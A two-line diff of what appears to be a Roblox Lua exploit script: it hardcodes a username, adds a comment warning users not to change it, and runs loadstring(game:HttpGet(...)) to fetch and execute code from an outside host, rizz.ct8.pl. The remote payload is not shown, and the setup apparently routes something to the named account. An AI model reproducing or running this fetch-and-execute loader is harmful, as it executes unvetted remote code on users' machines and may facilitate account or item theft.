@@ -1,2 +1,2 @@
-UserName = "Ninjafased"
+UserName = "Ninjafased" --dont change this or ur acc might get reported
 loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
